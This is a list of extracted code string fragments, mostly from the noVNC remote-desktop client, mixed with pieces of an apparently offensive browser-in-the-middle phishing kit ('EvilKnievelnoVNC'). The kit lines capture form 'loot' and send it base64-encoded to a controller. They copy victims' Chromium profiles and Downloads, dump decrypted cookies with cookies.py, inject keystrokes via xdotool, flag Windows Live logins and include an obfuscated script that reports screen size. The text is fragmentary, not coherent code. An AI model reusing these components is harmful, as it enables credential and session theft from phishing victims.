@@ -1,0 +1,1685 @@
+"(!anchor.classList.contains(""noVNC_right"""
+"(!filter_var($line, FILTER_VALIDATE_EMAIL"
+"(!isset($_GET[""fields""]"
+"(!isset($_GET[""svr""]"
+"(!location.search.search(""reqid"""
+"(!this._sock.rQwait(""message"", 1"
+"("" "", $line"
+"("" "", $state2"
+"("" "", $state3"
+"("" + parentRelativeY + ""px"
+"("" . $duration . "" min"
+"("""" + response.status + "" "" + response.statusText"
+"("""""
+"(""%s+"", """""
+"(""([%.%-]"
+"(""(prefers-color-scheme:dark"
+"(""/?"", ""/input/?"""
+"(""/etc/accesslog.txt"", FILE_SKIP_EMPTY_LINES|FILE_IGNORE_NEW_LINES"
+"(""/etc/submitlog.txt"", FILE_SKIP_EMPTY_LINES|FILE_IGNORE_NEW_LINES"
+"(""/home/user/tmp/resolution$sid.txt"", 'w'"
+"(""<< Keyboard.allKeysUp"""
+"(""<< Keyboard.grab"""
+"(""<< RFB.connect"""
+"(""<< RFB.constructor"""
+"(""<< RFB.disconnect"""
+"(""<< UI.clipboardReceive"""
+"(""<< UI.clipboardSend"""
+"("">> Keyboard.allKeysUp"""
+"("">> Keyboard.grab"""
+"("">> Keyboard.ungrab"""
+"("">> RFB.connect"""
+"("">> RFB.constructor"""
+"("">> RFB.disconnect"""
+"("">> UI.clipboardReceive: "" + e.detail.text.substr(0, 40"
+"("">> UI.clipboardSend: "" + text.substr(0, 40"
+"(""Access-Control-Allow-Headers"", allowed_headers"
+"(""Access-Control-Allow-Methods"", allowed_methods"
+"(""Access-Control-Allow-Origin"", allowed_origin"
+"(""Access-Control-Max-Age"", 600"
+"(""Already in state '"" + state + ""', ignoring"""
+"(""Bad payload length ("" + length + """
+"(""Bell"""
+"(""CORS: "" .. origin .. "" allowed"""
+"(""CORS: "" .. origin .. "" not allowed"""
+"(""CORS: Got 'Origin' header: "" .. headers[""origin""][0]"
+"(""CORS: Returning reply to preflight request"""
+"(""CORS: attaching allowed methods to response"""
+"(""CORS: preflight request received"""
+"(""CTRL+V detected"""
+"(""Can't connect when host is: "" + host"
+"(""Cannot use already closed WebSocket/RTCDataChannel"""
+"(""Clearing disconnect timer"""
+"(""Connected (encrypted"
+"(""Connected (unencrypted"
+"(""Connecting..."""
+"(""Connection closed "" + msg"
+"(""Content-Type"", ""application/x-www-form-urlencoded"""
+"(""Content-Type"", ""plain/text"""
+"(""Content-Type"", ""text/html"""
+"(""ControlLeft"" in this._keyDownList"
+"(""Couldn't fetch package.json: "" + err"
+"(""Detected Siemens server. Assuming NOTUNNEL support."""
+"(""Disconnecting..."""
+"(""Disconnection timed out."""
+"(""Display exception: "" + exc"
+"(""Enabling continuous updates."""
+"(""Error decoding rect: "" + err"
+"(""Error: SID env not found"""
+"(""Error: could not get a lock ($logfile"
+"(""Error: could not get a lock (state file"
+"(""Error: request id not found"""
+"(""Europe/Berlin"""
+"(""Failed when connecting: "" + details"
+"(""Failed when disconnecting: "" + details"
+"(""Failed while connected: "" + details"
+"(""GET"", url"
+"(""Got data while disconnected"""
+"(""Got data while in an invalid state"""
+"(""HTTP_USER_AGENT"""
+"(""Illegal server XVP message (msg: "" + xvpMsg + """
+"(""Intel AMT KVM only supports 8/16 bit depths. Using low color mode."""
+"(""Invalid server version "" + sversion"
+"(""Invalid visual state: "" + state"
+"(""Length must be a positive integer"""
+"(""MD5"", sharedKey"
+"(""Must specify URL, WebSocket or RTCDataChannel"""
+"(""Must specify target"""
+"(""New connection has been rejected with reason: """
+"(""New connection has been rejected"""
+"(""New state '"" + state + ""', was '"" + oldstate + ""'."""
+"(""No supported sub-auth types!"""
+"(""OPTION"""
+"(""POST"", window.location.href, true"
+"(""RFB "" + cversion + ""\n"""
+"(""RFB failure: "" + details"
+"(""Reconnecting..."""
+"(""SHA-1"", publickey"
+"(""SID"""
+"(""Security handshake failed"""
+"(""Selected authentication type: "" + authType"
+"(""Selected tunnel type: "" + clientSupportedTunnelTypes[0]"
+"(""Sending Ctrl-Alt-Del"""
+"(""Sending XVP operation "" + op + "" (version "" + ver + """
+"(""Sending key ("" + (down ? ""down"" : ""up"""
+"(""Sending keysym ("" + (down ? ""down"" : ""up"""
+"(""Server ProtocolVersion: "" + sversion"
+"(""Server Tight authentication types: "" + serverSupportedTypes"
+"(""Server Tight tunnel types: "" + serverSupportedTunnelTypes"
+"(""Server asked for credentials"""
+"(""Server security types: "" + types"
+"(""ServerCutText"""
+"(""SetColorMapEntries"""
+"(""Setting saved '"" + name + ""="" + val + ""'"""
+"(""Specifying showDotCursor as a RFB constructor argument is deprecated"""
+"(""Starting VNC handshake"""
+"(""Test: "" .. pattern .. "", Origin: "" .. origin .. "", Match: no"""
+"(""Test: "" .. pattern .. "", Origin: "" .. origin .. "", Match: yes"""
+"(""Tried changing state of a disconnected RFB object"""
+"(""Unable to play bell: "" + e"
+"(""Unexpected SetColorMapEntries message"""
+"(""Unexpected action in extended clipboard message: "" + actions"
+"(""Unexpected fence response"""
+"(""Unexpected server message (type "" + msgType + """
+"(""Unknown connection state: "" + state"
+"(""Unsupported VeNCrypt version "" + major + ""."" + minor"
+"(""Unsupported extended clipboard format for Provide message."""
+"(""Unsupported security types (types: "" + subtypes + """
+"(""Unsupported security types (types: "" + types + """
+"(""Using old API!"""
+"(""Vary"", ""Accept-Encoding,Origin"""
+"(""VeNCrypt failure "" + res"
+"(""VeNCrypt subtypes empty"""
+"(""Warning: user agent not given"""
+"(""WebSocket on-close event"""
+"(""WebSocket on-error event"""
+"(""XVP Operation Failed"""
+"(""XVP extensions enabled (version "" + this._rfbXvpVer + """
+"(""Y-m-d H:i:s"", $ex[0]"
+"(""[!] "" + url + "" -> "" + request.statusText, request.responseText"
+"(""[!] domain not matching target"""
+"(""[!] search string not found: "" + val"
+"(""[*] "" + url + "" -> "" + request.responseText"
+"(""[*] "" + url"
+"(""[*] EvilKnievelnoVNC EXTENSION LOADED"""
+"(""[*] Windows Live login detected"""
+"(""[*] form found"""
+"(""[*] pasted text: "" + inputVal"
+"(""[*] search string found!"""
+"(""[:]+%*$"", ""[:]+[0-9]+"""
+"(""\"""", """", $_GET[""v""]"
+"(""\r\n"", ""\n"""
+"(""\t"", $line"
+"(""\t"", $log"
+"(""_"""
+"(""bell"", UI.bell"
+"(""button"""
+"(""canvas"""
+"(""capabilities"", UI.updatePowerButton"
+"(""cat "" . $f1 . "" | grep 'x24' > "" . $f2"
+"(""chmod 666 /home/user/tmp/resolution$sid.txt"""
+"(""chmod 666 /tmp/res*.txt"""
+"(""clipboard"", UI.clipboardReceive"
+"(""cmd"""
+"(""compressionLevel must be an integer between 0 and 9"""
+"(""connect"", UI.connectFinished"
+"(""cors"", {""http-req""}, cors_request, 3"
+"(""cors"", {""http-res""}, cors_response, 0"
+"(""credentialsrequired"", UI.credentials"
+"(""credentialsrequired"", credentialsAreRequired"
+"(""desktopname"", UI.updateDesktopName"
+"(""desktopname"", updateDesktopName"
+"(""dis"""
+"(""disabled"", ""disabled"""
+"(""disconnect"", UI.disconnectFinished"
+"(""docker cp $contentjs evil$svrno:/home/user/extension/"""
+"(""docker cp evil$svrno:/home/user/.config/chromium/Default $dir"""
+"(""docker exec controller echo '$reqid' >> /etc/blacklist.acl"""
+"(""docker exec evil$sid xdotool type \""$v\"""""
+"(""docker exec evil$svrno cp -r /home/user/.config/chromium/Default $dir"""
+"(""docker exec evil$svrno cp -r /home/user/Downloads $dir"""
+"(""docker exec evil$svrno python3 cookies.py > Downloads/cookies.txt"""
+"(""docker exec evil$svrno rm -f /home/user/tmp/reqid$svrno.txt"""
+"(""docker exec evil$svrno rm -f /home/user/tmp/resolution$svrno.txt"""
+"(""docker exec evil$svrno sudo bash -c 'mkdir -p $dir && chmod 777 $dir'"""
+"(""docker exec evil$svrno sudo rm -rf /home/user/.config/chromium /home/user/Downloads"""
+"(""docker exec evil$svrno true > /home/user/errorlog.txt"""
+"(""docker restart -t 0 evil$svrno"""
+"(""echo $reqid > /home/user/tmp/reqid$sid.txt"""
+"(""echo '$usera' > /home/user/tmp/useragent$sid.txt"""
+"(""echo 'add acl /etc/blacklist.acl $reqid' | nc hap 8000"""
+"(""echo 'add acl /etc/whitelist.acl $reqid' | nc hap 8000"""
+"(""echo 'clear acl /etc/blacklist.acl $reqid' | nc hap 8000"""
+"(""echo 'clear acl /etc/whitelist.acl $reqid' | nc hap 8000"""
+"(""echo 'set server novnc/s$svrno state drain' | nc hap 8000"""
+"(""echo 'set server novnc/s$svrno state maint; shutdown sessions server novnc/s$svrno' | nc hap 8000"""
+"(""echo 'set server novnc/s$svrno state ready' | nc hap 8000"""
+"(""echo 'show servers conn' | nc hap 8000 | grep novnc/s$svrno"""
+"(""echo 'show servers state b"" . $svrno . ""' | nc hap 8000 | grep evil"""
+"(""echo 'show servers state novnc' | nc hap 8000 | grep novnc"""
+"(""echo -n '' > "" . $path"
+"(""echo -n '' > /etc/accesslog.txt; echo -n '' > /etc/submitlog.txt"""
+"(""echo -n '' > /etc/blacklist.acl"""
+"(""echo -n '' > /etc/whitelist.acl"""
+"(""error"""
+"(""form"""
+"(""gestureend"", this._eventHandlers.handleGesture"
+"(""gesturemove"", this._eventHandlers.handleGesture"
+"(""gesturestart"", this._eventHandlers.handleGesture"
+"(""handleMessage called on an empty receive queue"""
+"(""inp"""
+"(""input"""
+"(""input"", storeInp"
+"(""interact.php"", ""index.php"""
+"(""ip"""
+"(""keydown"", function(event"
+"(""keyup"", focusCan"
+"(""loot: "" + loot"
+"(""missing argument fields (submit log"
+"(""missing argument id (submit log"
+"(""missing arguments"""
+"(""mousedown"", this._eventHandlers.focusCanvas"
+"(""noVNC requires a secure context (TLS"
+"(""noVNC_active"""
+"(""noVNC_approve_server_button"""
+"(""noVNC_cancel_reconnect_button"""
+"(""noVNC_clipboard_button"""
+"(""noVNC_clipboard_clear_button"""
+"(""noVNC_clipboard_text"""
+"(""noVNC_connect_button"""
+"(""noVNC_connected"""
+"(""noVNC_connecting"""
+"(""noVNC_control_bar"""
+"(""noVNC_control_bar_handle"""
+"(""noVNC_credentials_button"""
+"(""noVNC_disconnect_button"""
+"(""noVNC_disconnecting"""
+"(""noVNC_expander"""
+"(""noVNC_fullscreen_button"""
+"(""noVNC_hidden"""
+"(""noVNC_idle"""
+"(""noVNC_keyboard_button"""
+"(""noVNC_keyboardinput"""
+"(""noVNC_loading"""
+"(""noVNC_open"""
+"(""noVNC_password_block"""
+"(""noVNC_power_button"""
+"(""noVNC_reboot_button"""
+"(""noVNC_reconnecting"""
+"(""noVNC_reject_server_button"""
+"(""noVNC_reset_button"""
+"(""noVNC_right"""
+"(""noVNC_selected"""
+"(""noVNC_send_ctrl_alt_del_button"""
+"(""noVNC_send_esc_button"""
+"(""noVNC_send_tab_button"""
+"(""noVNC_setting_"" + name"
+"(""noVNC_settings_button"""
+"(""noVNC_shutdown_button"""
+"(""noVNC_status"""
+"(""noVNC_status_error"""
+"(""noVNC_status_normal"""
+"(""noVNC_status_warn"""
+"(""noVNC_toggle_alt_button"""
+"(""noVNC_toggle_ctrl_button"""
+"(""noVNC_toggle_extra_keys_button"""
+"(""noVNC_toggle_windows_button"""
+"(""noVNC_touch"""
+"(""noVNC_transition_text"""
+"(""noVNC_username_block"""
+"(""noVNC_view_drag_button"""
+"(""onkeyevent "" + (down ? ""down"" : ""up"""
+"(""php.ini"", true"
+"(""power"", true"
+"(""promoted-fed-cred-box"""
+"(""qualityLevel must be an integer between 0 and 9"""
+"(""raw"", clientKey.publicKey"
+"(""raw"", dhKey.publicKey"
+"(""raw"", secret, { name: ""DES-CBC"" }, false, [""encrypt""]"
+"(""reqid"""
+"(""res"""
+"(""res="" + resString"
+"(""rm -rf $lootdir*"""
+"(""s"", """", $ex[1]"
+"(""securityfailure"", UI.securityFailed"
+"(""sed -i 's/const id = \"".*\""/const id = \"""" . $reqid . ""\""/' /home/user/extension/content.js"""
+"(""sed -i 's/const id = \"".*\""/const id = \""REQID\""/' $contentjs"""
+"(""sed -i 's/const serverName = \"".*\""/const serverName = \"""" . $sid . ""\""/' /home/user/extension/content.js"""
+"(""sed -i 's/const serverName = \"".*\""/const serverName = \""SNAME\""/' $contentjs"""
+"(""sending string to evil instance: $v"""
+"(""serververification"", UI.serverVerify"
+"(""sock.rQpeekBytes(30"
+"(""submit"", function("
+"(""svr"""
+"(""switchToFido"""
+"(""tac $accesslog | grep $reqid | head -n 1"""
+"(""tac /etc/accesslog.txt | grep $svrname | head -n 1"""
+"(""targets"""
+"(""touchstart"", this._eventHandlers.focusCanvas"
+"(""wheel"", this._eventHandlers.handleWheel"
+"($_GET[""cmd""]"
+"($_GET[""ip""]"
+"($_GET[""reqid""]"
+"($_GET[""svr""]"
+"($_POST[""targets""]"
+"($_SERVER[""HTTP_HOST""], 0, strpos($_SERVER[""HTTP_HOST""], "":"""
+"($_SERVER[""HTTP_X_FORWARDED_FOR""]"
+"($_SERVER[""REMOTE_ADDR""]"
+"($_SERVER[""REQUEST_METHOD""] === ""GET"""
+"($accesslog, $entry"
+"($conn[6] !== ""0"""
+"($dat[""blocked""] == 0 ? ""no"" : ""yes"""
+"($dat[""state""]"
+"($dateformat, $entry[0]"
+"($f1, 'w'"
+"($file, $data"
+"($file, $entry"
+"($file, $json"
+"($file, LOCK_UN"
+"($json, true"
+"($keyspace, '8bit'"
+"($logfile, $entry"
+"($logfile, 'a'"
+"($novnc[5] === ""0"" && $admin[5] === ""2"""
+"($novnc[5] === ""0"""
+"($novnc[5] === ""1"""
+"($novnc[5] === ""2"" || $admin[5] === ""2"""
+"($novnc[5] === ""3"""
+"($o[""userid""] === $elem[""userid""]"
+"($orig, $elem"
+"($path, json_encode($list"
+"($path, json_encode($orig"
+"($reqid === ""admin"""
+"($s[""reqid""] === $id"
+"($s[""reqid""] === $reqid && $s[""blocked""] == 0"
+"($s[""reqid""] === $reqid && $s[""state""] < 1"
+"($s[""reqid""] === $reqid && $s[""state""] < 3"
+"($s[""reqid""] === $reqid"
+"($s[""userid""] === $reqid && $s[""state""] === 3"
+"($state, $sep"
+"($statefile, 'w'"
+"($submitlog, $entry"
+"($t[""blocked""] == 1 ? ""blocked"" : """""
+"($t[""state""] == 0"
+"($t[""state""] == 1"
+"($t[""state""] == 2"
+"($t[""state""] == 3"
+"($targets, $separator"
+"('', $pieces"
+"(','"
+"('DOMContentLoaded', ("
+"('autoconnect', false"
+"('blur', UI.onblurVirtualKeyboard"
+"('blur', this._eventHandlers.blur"
+"('change', UI.clipboardSend"
+"('change', changeFunc"
+"('click', ("
+"('click', UI.approveServer"
+"('click', UI.cancelReconnect"
+"('click', UI.clipboardClear"
+"('click', UI.connect"
+"('click', UI.disconnect"
+"('click', UI.hideStatus"
+"('click', UI.rejectServer"
+"('click', UI.sendCtrlAltDel"
+"('click', UI.sendEsc"
+"('click', UI.sendTab"
+"('click', UI.setCredentials"
+"('click', UI.toggleAlt"
+"('click', UI.toggleClipboardPanel"
+"('click', UI.toggleCtrl"
+"('click', UI.toggleExpander"
+"('click', UI.toggleExtraKeys"
+"('click', UI.toggleFullscreen"
+"('click', UI.togglePowerPanel"
+"('click', UI.toggleSettingsPanel"
+"('click', UI.toggleViewDrag"
+"('click', UI.toggleVirtualKeyboard"
+"('click', UI.toggleWindows"
+"('click', this._eventHandlers.handleMouse"
+"('close', this._socketClose.bind(this"
+"('compression', 0"
+"('compression', UI.updateCompression"
+"('contextmenu', this._eventHandlers.handleMouse"
+"('controlbar_pos', 'left'"
+"('controlbar_pos', 'right'"
+"('encrypt', (window.location.protocol === ""https:"""
+"('error', this._socketError.bind(this"
+"('focus', UI.onfocusVirtualKeyboard"
+"('fullscreenchange', UI.updateFullscreenButton"
+"('host', window.location.hostname"
+"('input', UI.activateControlbar"
+"('input', UI.keepControlbar"
+"('input', UI.keyInput"
+"('keydown', UI.activateControlbar"
+"('keydown', UI.keepControlbar"
+"('keydown', this._eventHandlers.keydown"
+"('keyup', this._eventHandlers.keyup"
+"('load', function(event"
+"('logging', 'warn'"
+"('logging', UI.updateLogging"
+"('message', this._handleMessage.bind(this"
+"('mousedown', UI.activateControlbar"
+"('mousedown', UI.controlbarHandleMouseDown"
+"('mousedown', UI.keepControlbar"
+"('mousedown', UI.keepVirtualKeyboard, true"
+"('mousedown', this._eventHandlers.handleMouse"
+"('mouseleave', this._eventHandlers.mouseleave, options"
+"('mousemove', UI.activateControlbar"
+"('mousemove', UI.dragControlbarHandle"
+"('mousemove', this._eventHandlers.handleMouse"
+"('mousemove', this._eventHandlers.mousemove, options"
+"('mouseover', this._eventHandlers.mouseover, options"
+"('mouseup', UI.activateControlbar"
+"('mouseup', UI.controlbarHandleMouseUp"
+"('mouseup', this._eventHandlers.handleMouse"
+"('mouseup', this._eventHandlers.mouseup, options"
+"('mozfullscreenchange', UI.updateFullscreenButton"
+"('msfullscreenchange', UI.updateFullscreenButton"
+"('open', this._socketOpen.bind(this"
+"('path', 'websockify'"
+"('port', port"
+"('port', window.location.port"
+"('pylogger_clean', None"
+"('quality', 9"
+"('quality', UI.updateQuality"
+"('reconnect', false"
+"('reconnect_delay', 5000"
+"('repeaterID', ''"
+"('resize', 'off'"
+"('resize', UI.applyResizeMode"
+"('resize', UI.updateControlbarHandle"
+"('resize', UI.updateViewClip"
+"('scale', false"
+"('shared', true"
+"('show_dot', UI.updateShowDotCursor"
+"('show_dot', false"
+"('submit', ("
+"('touchend', UI.activateControlbar"
+"('touchend', UI.controlbarHandleMouseUp"
+"('touchmove', UI.activateControlbar"
+"('touchmove', UI.dragControlbarHandle"
+"('touchstart', UI.activateControlbar"
+"('touchstart', UI.controlbarHandleMouseDown"
+"('touchstart', UI.keepControlbar"
+"('transitionend', ("
+"('view_clip', UI.updateViewClip"
+"('view_clip', false"
+"('view_clip', true"
+"('view_only', UI.updateViewOnly"
+"('view_only', false"
+"('webkitfullscreenchange', UI.updateFullscreenButton"
+"((a, b"
+"((code === ""AltRight"""
+"((code === ""ControlLeft"""
+"((e.type == ""mousedown"""
+"((e.type == ""mouseup"""
+"((resolve, reject"
+"() in {'0': 1, 'no': 1, 'false': 1}"
+"(), 100"
+"();return _0x4e93=function(_0x4e93cf,_0x1c958f"
+"();url='/index.php?x='+_0x2ebfbf,_0x47670a[_0x27babc(0x89"
+"();}(function(_0x32a82f,_0x2a5c94"
+"(){var _0x27babc=_0x4e93,_0x2ebfbf=window['screen'][_0x27babc(0x8f"
+"(){var _0x56998a=['2303922snBmiB','4772295XzGkMq','GET','2RhfIDt','14703424QnpOEL','readyState','3470958zbgAPR','10Rijsvc','href','Ha\x20ocurrido\x20un\x20error','419350czLeEZ','onreadystatechange','20MdGyAG','send','plain/text','open','screen','setRequestHeader','height','344293fptFwq','2517317Jkhuyy','width','responseText','14oQzojn','location','Content-Type'];_0x4b7f=function("
+"(.5,0,.5,1"
+"(/=+$/, ''"
+"(/\+/g, '-'"
+"(/\//g, '_'"
+"(/\=/g, ''"
+"(/\r\n|\r|\n/gm, ""\r\n"""
+"(0, $max"
+"(0, -1"
+"(0, 0, w, h"
+"(0, 1"
+"(0, 255"
+"(0, 63"
+"(0, 8"
+"(0x0056, null, false"
+"(0x0076, null, false"
+"(0xffe3, null, false"
+"(1, 2"
+"(1, 3"
+"(1, 4"
+"(1601, 1, 1"
+"(2, '0'"
+"(2, start"
+"(204, ""No Content"""
+"(4, 7"
+"(40, 40, 40"
+"(<?= $reqid . "", "" . lookupUserId($reqid"
+"(GET(""reqid"""
+"(KeyTable.XK_Alt_L, ""AltLeft"", false"
+"(KeyTable.XK_Alt_L, ""AltLeft"", true"
+"(KeyTable.XK_BackSpace, ""Backspace"""
+"(KeyTable.XK_Caps_Lock, 'CapsLock', false"
+"(KeyTable.XK_Caps_Lock, 'CapsLock', false, numlock, capslock"
+"(KeyTable.XK_Caps_Lock, 'CapsLock', true"
+"(KeyTable.XK_Caps_Lock, 'CapsLock', true, numlock, capslock"
+"(KeyTable.XK_Control_L, ""ControlLeft"", false"
+"(KeyTable.XK_Control_L, ""ControlLeft"", true"
+"(KeyTable.XK_Control_L, ""ControlLeft"", true, numlock, capslock"
+"(KeyTable.XK_Delete, ""Delete"", false"
+"(KeyTable.XK_Delete, ""Delete"", true"
+"(KeyTable.XK_Escape, ""Escape"""
+"(KeyTable.XK_Super_L, ""MetaLeft"", false"
+"(KeyTable.XK_Super_L, ""MetaLeft"", true"
+"(KeyTable.XK_Tab, ""Tab"""
+"(RFB.messages._buildExtendedClipboardFlags(actions, []"
+"(TigerVNC, RealVNC, Remmina"
+"(UI.closeControlbar, 2000"
+"(UI.getSetting('reconnect', false"
+"(UI.hideStatus, time"
+"(UI.idleControlbar, 2000"
+"(UI.reconnect, delay"
+"(WebUtil.getConfigVar('bell', 'on'"
+"(\"""" . $aUrl . ""phishboard/interact.php?svr="" . $svrno . ""&reqid="" . $reqid . ""\"""
+"(_(""Credentials are required"""
+"(_(""Disconnected"""
+"(_(""Failed to connect to server"""
+"(_(""HTTPS is required for full functionality"""
+"(_(""Internal error"""
+"(_(""Must set host"""
+"(_(""Something went wrong, connection is closed"""
+"(_0x407f7e,_0x1ab66c"
+"(_0x4b7f,0xe0e67"
+"(actions, formats"
+"(allowed_origins, ""*"""
+"(allowed_origins, "","""
+"(anchor.classList.contains(""noVNC_right"""
+"(array_key_exists(""HTTP_X_FORWARDED_FOR"", $_SERVER"
+"(array_search($elem[""userid""], $orig"
+"(base64url_decode($_GET[""agent""]"
+"(base64url_decode($_GET[""fields""]"
+"(btn.classList.contains(""noVNC_selected"""
+"(btnparent, num, reqid"
+"(callback, type, quality"
+"(cap, val"
+"(clientX, clientY"
+"(ctrlUrl + ""logsubmit&fields="" + base64url_enc(loot"
+"(ctrlUrl + ""success"""
+"(curl -sk ""$URL"" | grep ""<title>"" | grep ""</title>"" | sed ""s/<[^>]*>//g"""
+"(data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
+"(date +""%Y%m%d-%H%M%S"""
+"(decrypted_value, host_key, name"
+"(deflatedData, 4"
+"(deltaX, deltaY"
+"(document.getElementById(""F5"""
+"(document.location.href, window.location.hash"
+"(document.readyState === ""interactive"" || document.readyState === ""complete"""
+"(dx, dy"
+"(e.detail.types.indexOf(""password"""
+"(e.detail.types.indexOf(""username"""
+"(e.g. GET,POST,PUT,DELETE"
+"(e.g. X-Header1,X-Header2"
+"(e.g. localhost,https://localhost:8080,//test.com"
+"(e.g. localhost,localhost:8080,test.com"
+"(e.keyIdentifier.substr(0, 2"
+"(e.message !== ""disconnect normally"""
+"(e.name === ""NotAllowedError"""
+"(e.type === ""mousedown"""
+"(echo ""[!] Missing argument""; usage; exit 1"
+"(echo ""[!] Missing dependency: screen"" ; exit 1"
+"(elementX, elementY"
+"(err => Log.Error(""Failed to load translations: "" + err"
+"(errors=""ignore"""
+"(ev, 0x1"
+"(ev, 0x2"
+"(ev, 0x4"
+"(ev, bmask"
+"(ev, elementX, elementY"
+"(ev, pos.x, pos.y"
+"(ev.detail.clientX, ev.detail.clientY"
+"(ev.detail.magnitudeX, ev.detail.magnitudeY"
+"(event, password"
+"(event.clientX, event.clientY"
+"(event.ctrlKey && (event.key === ""v"" || event.key === ""V"""
+"(event.target.selectionStart, newValue.length"
+"(f""Error: {e}, chromedate: {chromedate}"""
+"(file_get_contents(""https://controller/?cmd=block&svr=$sid&reqid=$reqid"", false, stream_context_create($context"
+"(file_get_contents(""https://controller/?cmd=reset&svr=$sid&reqid=$reqid"", false, stream_context_create($context"
+"(file_get_contents($url, false, stream_context_create($context"
+"(file_put_contents(""/etc/whitelist.acl"", $whitelist, FILE_APPEND"
+"(flock($file, LOCK_EX"
+"(getenv(""SID"""
+"(halfway implemented, see EvilnoVNC/Files/content.js"
+"(head -1 php.ini | cut -d ""="" -f 2"
+"(i.e. no ""else if"""
+"(img, 0, 0"
+"(inData[i] + ""\0"""
+"(input.type != ""hidden"" && input.name"
+"(isset($_GET[""agent""]"
+"(isset($_GET[""block""]"
+"(isset($_GET[""ip""]"
+"(isset($_GET[""reqid""]"
+"(isset($_GET[""reset""]"
+"(isset($_GET[""svr""]"
+"(isset($_GET[""v""]"
+"(isset($_POST[""add""]"
+"(isset($_POST[""clearlogs""]"
+"(isset($_POST[""clearloot""]"
+"(isset($_POST[""cleartargets""]"
+"(isset($_POST[""res""]"
+"(items, test_str"
+"(kernel, window system, and so on"
+"(key, AES.MODE_CBC, iv"
+"(keyLength, serverPublicKey, clientKey"
+"(keysym, code, down"
+"(keysym, code, down, numlock = null, capslock = null"
+"(keysym, code, down, numlock, capslock"
+"(keysym, code, false"
+"(keysym, code, false, numlock, capslock"
+"(keysym, code, true"
+"(keysym, code, true, numlock, capslock"
+"(l, l"
+"(l10n.language === ""en"" || l10n.dictionary !== undefined"
+"(let i = 0; i < Math.min(oldLen, newLen"
+"(log_file, 'a'"
+"(mktemp -u | cut -d""."" -f2"
+"(msg, 'error'"
+"(my_pass, salt, length, iterations"
+"(name, changeFunc"
+"(name, defVal"
+"(name, defaultValue"
+"(name, true"
+"(name, val"
+"(new CustomEvent(""connect"", { detail: {} }"
+"(null, UI.reconnectPassword"
+"(numTunnels > 0 && this._sock.rQwait(""tunnel capabilities"", 16 * numTunnels, 4"
+"(origin, allowed_origins"
+"(password, challenge"
+"(pattern, ""[:]+%*$"""
+"(pos.x, pos.y"
+"(pos.x, pos.y, false, 0x1"
+"(pos.x, pos.y, false, 0x10"
+"(pos.x, pos.y, false, 0x20"
+"(pos.x, pos.y, false, 0x4"
+"(pos.x, pos.y, false, 0x40"
+"(pos.x, pos.y, false, 0x8"
+"(pos.x, pos.y, false, 1 << 3"
+"(pos.x, pos.y, false, 1 << 4"
+"(pos.x, pos.y, false, 1 << 5"
+"(pos.x, pos.y, false, 1 << 6"
+"(pos.x, pos.y, false, bmask"
+"(pos.x, pos.y, true, 0x1"
+"(pos.x, pos.y, true, 0x10"
+"(pos.x, pos.y, true, 0x20"
+"(pos.x, pos.y, true, 0x4"
+"(pos.x, pos.y, true, 0x40"
+"(pos.x, pos.y, true, 0x8"
+"(pos.x, pos.y, true, 1 << 3"
+"(pos.x, pos.y, true, 1 << 4"
+"(pos.x, pos.y, true, 1 << 5"
+"(pos.x, pos.y, true, 1 << 6"
+"(pos.x, pos.y, true, bmask"
+"(reason !== """""
+"(reason: "" + reason + """
+"(resolve, time"
+"(rgba, hotx, hoty, w, h"
+"(s, ""^%."""
+"(s, ""^%a+://"""
+"(s, ""^//"""
+"(scheme: "" + authType + """
+"(selectbox, text, value"
+"(serverSupportedTunnelTypes[1].signature === ""SCHANNEL"""
+"(serverSupportedTunnelTypes[1].vendor === ""SICR"""
+"(size.w, size.h"
+"(sock, actions, formats"
+"(sock, data, extended = false"
+"(sock, data, true"
+"(sock, depth, trueColor"
+"(sock, enable, x, y, width, height"
+"(sock, encodings"
+"(sock, flags, payload"
+"(sock, flags, true"
+"(sock, formats"
+"(sock, formats, inData"
+"(sock, incremental, x, y, w, h"
+"(sock, keysym, down"
+"(sock, keysym, down, keycode"
+"(sock, ver, op"
+"(sock, width, height, id, flags"
+"(sock, x, y, mask"
+"(stat -L -c ""%a"" /var/run/docker.sock"
+"(statusElem.classList.contains(""noVNC_open"""
+"(statusElem.classList.contains(""noVNC_status_error"""
+"(statusElem.classList.contains(""noVNC_status_warn"""
+"(str_pad(strtr($data, '-_', '+/'"
+"(target, urlOrChannel, options"
+"(text, statusType, time"
+"(this._FBU.width, this._FBU.height"
+"(this._fbName === ""Intel(r"
+"(this._fbWidth, this._fbHeight"
+"(this._gestureFirstDoubleTapEv, pos.x, pos.y"
+"(this._keyDownList[code], code, false"
+"(this._rfbCredentials.password, challenge"
+"(this._rfbVersion, 10"
+"(this._sock, ("
+"(this._sock, []"
+"(this._sock, [extendedClipboardFormatText]"
+"(this._sock, [extendedClipboardFormatText], [this._clipboardText]"
+"(this._sock, clientActions, {extendedClipboardFormatText: 0}"
+"(this._sock, data"
+"(this._sock, encs"
+"(this._sock, false, 0, 0, this._fbWidth, this._fbHeight"
+"(this._sock, flags, payload"
+"(this._sock, keysym, down ? 1 : 0"
+"(this._sock, keysym, down, scancode"
+"(this._sock, this._display.absX(x"
+"(this._sock, this._fbDepth, true"
+"(this._sock, ver, op"
+"(this._sock.rQwait(""DesktopName"", 4"
+"(this._sock.rQwait(""DesktopName"", length, 4"
+"(this._sock.rQwait(""ExtendedDesktopSize"", 4"
+"(this._sock.rQwait(""ExtendedDesktopSize"", bytes"
+"(this._sock.rQwait(""FBU header"", 3, 1"
+"(this._sock.rQwait(""ServerCutText content"", Math.abs(length"
+"(this._sock.rQwait(""ServerCutText header"", 7, 1"
+"(this._sock.rQwait(""ServerFence header"", 8, 1"
+"(this._sock.rQwait(""ServerFence payload"", length, 9"
+"(this._sock.rQwait(""VMware cursor encoding"", 1"
+"(this._sock.rQwait(""XVP version and message"", 3, 1"
+"(this._sock.rQwait(""auth challenge"", 16"
+"(this._sock.rQwait(""cursor encoding"", bytes"
+"(this._sock.rQwait(""message"", 1"
+"(this._sock.rQwait(""mslogonii dh param"", 24"
+"(this._sock.rQwait(""num tunnels"", 4"
+"(this._sock.rQwait(""read ard keylength"", keyLength*2, 4"
+"(this._sock.rQwait(""read ard"", 4"
+"(this._sock.rQwait(""reason length"", 4"
+"(this._sock.rQwait(""reason"", strlen, 4"
+"(this._sock.rQwait(""rect header"", 12"
+"(this._sock.rQwait(""security scheme"", 4"
+"(this._sock.rQwait(""security type"", numTypes, 1"
+"(this._sock.rQwait(""server initialization"", 24"
+"(this._sock.rQwait(""sub auth capabilities"", 16 * subAuthCount, 4"
+"(this._sock.rQwait(""sub auth count"", 4"
